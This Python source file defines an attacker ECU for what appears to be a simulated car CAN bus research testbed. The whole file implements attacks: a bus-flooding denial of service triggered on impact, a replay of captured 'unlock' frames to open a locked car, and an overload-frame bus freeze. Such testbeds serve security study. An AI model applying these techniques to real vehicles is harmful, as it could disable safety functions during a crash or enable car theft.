import codecs
import re
import threading
import time
from datetime import datetime, timedelta
from enum import Enum

import can
from pyee import EventEmitter

from car import Car, CarSensorsEvents
from ecus.base_ecu import BaseECU

# The event fired when a frame to replay has been found and the ECU has to stop searching for other frames
STOP_LISTENING = 'STOP_LISTENING'
# The event fired to inform of the Replay attack result
REPLAY_RESULT = 'REPLAY_RESULT'


# The type of attacks that this ECU can perform
class AttackTypes(Enum):
    DoSOnImpact = 1,  # When the car detects and impact performs a DoS attack against the bus
    ReplayToUnlock = 2,  # A Replay attack to unlock the car after it has been locked
    FreezeDoomLoop = 3  # Generic Freeze Doom Loop attack


# An ECU designed to perform attacks against the bus where it is installed
class AttackerECU(BaseECU):
    def _start_operations(self):
        car = Car.get_instance()
        if self.attack_type == AttackTypes.DoSOnImpact:
            car.subscribe_to_event(CarSensorsEvents.IMPACT, lambda x: self._perform_dos())
        elif self.attack_type == AttackTypes.ReplayToUnlock:
            self._perform_replay()
        elif self.attack_type == AttackTypes.FreezeDoomLoop:
            self._perform_freeze_doom_loop()

    def __init__(self, bus, attack_type: AttackTypes):
        super().__init__(bus)
        self.attack_type = attack_type
        self.ev_emitter = EventEmitter()

        self.thread_event_1 = None
        self.thread_event_2 = None

    def _perform_dos(self):
        """
        Performs a DoS attack against the bus sending many messages of maximum priority.
        The bus will stay blocked for 5 seconds.
        """
        start = datetime.now()
        while datetime.now() - start <= timedelta(seconds=5):
            self.send_msg(0x0, 'DoS')

    def _look_for_unlock(self, msg: can.Message):
        """
        Checks whether a frame containing 'unlock' in the data is transmitted on the bus, and sets the
        self.replay_result event in case of success.
        :param msg: The message read from the bus.
        """
        msg_data = codecs.decode(msg.data, 'hex')
        for _ in re.finditer(b'unlock', msg_data, re.IGNORECASE):
            # Check that this message is not the replayed message but one of its effects
            if msg.arbitration_id != self.replay_msg[0] or msg_data != self.replay_msg[1]:
                self.replay_result.set()

    def _get_replay_result(self) -> bool:
        """
        Returns the result of the Replay attack. If no successful response is returned in 5 seconds from the result
        checker, consider it a failure.
        """
        # Wait maximum 5 secs to get a result from the checker
        self.replay_result.wait(5)
        # Remove the checker listener
        self.stop_listening(self.replay_check_listener)
        # Return the attack's result
        return self.replay_result.is_set()

    def _check_replay_success(self):
        """
        Start a new thread where the ECU can listen to the bus to check whether the attack produces
        the desired effect.
        """
        # Initialize the event used to know whether the attack was successful
        self.replay_result = threading.Event()
        # Listen to the bus to check whether the attack produces the desired effect
        self.replay_check_listener = self.listen_to_bus(self._look_for_unlock)

    def _find_unlocking_frame_and_replay(self, msg: can.Message):
        """
        Searches for a message on the bus containing 'unlock' in the data and when found replays the message.
        :param msg: The message read from the bus.
        """
        msg_data = codecs.decode(msg.data, 'hex')
        for _ in re.finditer(b'unlock', msg_data, re.IGNORECASE):
            # A message containing 'unlock' has been found
            # Stop listening for messages since the target has been found
            self.stop_listening(self.replay_listener)
            # Save the target to replay it in the future
            self.replay_msg = (msg.arbitration_id, msg_data.decode())
            # Inform the interested parts that the target has been found
            self.replay_result.set()

    def _perform_replay(self):
        """
        Performs a Replay attack to unlock the car after it has been locked.
        """
        # Initialize the event used to know when the message to replay is found
        self.replay_result = threading.Event()
        # Start looking for the message to replay
        self.replay_listener = self.listen_to_bus(self._find_unlocking_frame_and_replay)
        # Wait for the message to replay to be found
        self.replay_result.wait()

        # Wait for some time before performing the attack
        time.sleep(5)

        # The message to replay has been found, then start checking for the attack's result
        self._check_replay_success()

        # Replay the message
        self.send_msg(self.replay_msg[0], self.replay_msg[1])

        # Get the attack's result
        if self._get_replay_result():
            print("\n\nReplay Success\n\n")
        else:
            print("\n\nReplay Failure\n\n")
            # Retry the attack if it failed
            self._perform_replay()

    def _perform_freeze_doom_loop(self):
        """
        Performs a Freeze Doom Loop attack on the bus sending many Overload frames.
        The bus is frozen for 5 seconds.
        """
        # Wait 3 seconds before starting the attack
        time.sleep(3)

        start = datetime.now()
        while datetime.now() - start <= timedelta(seconds=5):
            self.send_overload()
